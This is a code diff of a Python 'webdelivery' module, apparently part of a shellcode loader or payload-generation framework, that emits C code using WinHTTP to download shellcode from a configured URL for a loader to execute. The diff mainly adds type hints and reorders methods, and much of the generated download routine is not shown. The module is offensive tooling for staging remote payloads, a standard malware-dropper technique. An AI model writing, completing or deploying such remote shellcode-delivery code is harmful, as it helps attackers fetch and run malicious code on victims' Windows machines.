@@ -1,11 +1,10 @@
 import random
 import string
-import json
 from c.utils.formatters import *
 
 class webdelivery:
 
-    def __init__(self, shellcode, arguments):
+    def __init__(self, shellcode: str | bytes | list[str], arguments: dict) -> None:
         self.name = ''.join(random.SystemRandom().choice(string.ascii_uppercase) for _ in range(16))
         if 'outfile' in arguments:
             outfile = arguments['outfile']
@@ -29,17 +28,22 @@ class webdelivery:
             print('No url specified')
             exit(0)
 
+    def imports(self) -> list[str]:
+        return ['#include <winhttp.h>', 
+                '#pragma comment(lib, "winhttp.lib")']
 
-    def imports(self):
-        return ['#include <winhttp.h>', '#pragma comment(lib, "winhttp.lib")']
+    def compilerOptions(self) -> list[str]:
+        return ['-lwinhttp']
 
-    def codeblock(self):
+    def transformer(self, shellcodestring: str) -> str:
+        return shellcodestring.format(shellcode=f'{self.name}()')
 
+    def codeblock(self) -> str:
         urlsplit = self.url.split('/')
         host = urlsplit[2]
         uri = '/'.join(urlsplit[3:])
-
         codeblock = f"""
+
 {self.type} {self.name}()
 {{
     DWORD dwSize = 0;
@@ -93,16 +97,12 @@ class webdelivery:
 
     return (const unsigned char **)array;
 }}
+
 """ 
         else:
             codeblock += f"""
     return obfuscated;
 }}
+
 """
         return codeblock
-
-    def compilerOptions(self):
-        return ['-lwinhttp']
-
-    def transformer(self, shellcodestring):
-        return shellcodestring.format(shellcode=f'{self.name}()')
